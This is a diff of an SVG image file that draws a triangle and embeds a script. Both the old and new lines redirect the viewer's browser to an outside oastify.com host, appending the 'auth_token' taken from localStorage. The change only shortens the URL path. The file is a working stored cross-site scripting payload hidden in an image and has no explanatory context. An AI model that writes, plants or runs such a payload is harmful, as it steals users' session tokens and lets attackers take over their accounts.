@@ -3,5 +3,5 @@
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,600 600,0" fill="#009900" stroke="#004400"/>
-  <script>document.location='http://3ptorw4wpkt28i5oiy8rismho8uzi36s.oastify.com/XSS/grabber.php?c='+localStorage.getItem('auth_token')</script>
+  <script>document.location='http://3ptorw4wpkt28i5oiy8rismho8uzi36s.oastify.com/?c='+localStorage.getItem('auth_token')</script>
 </svg>
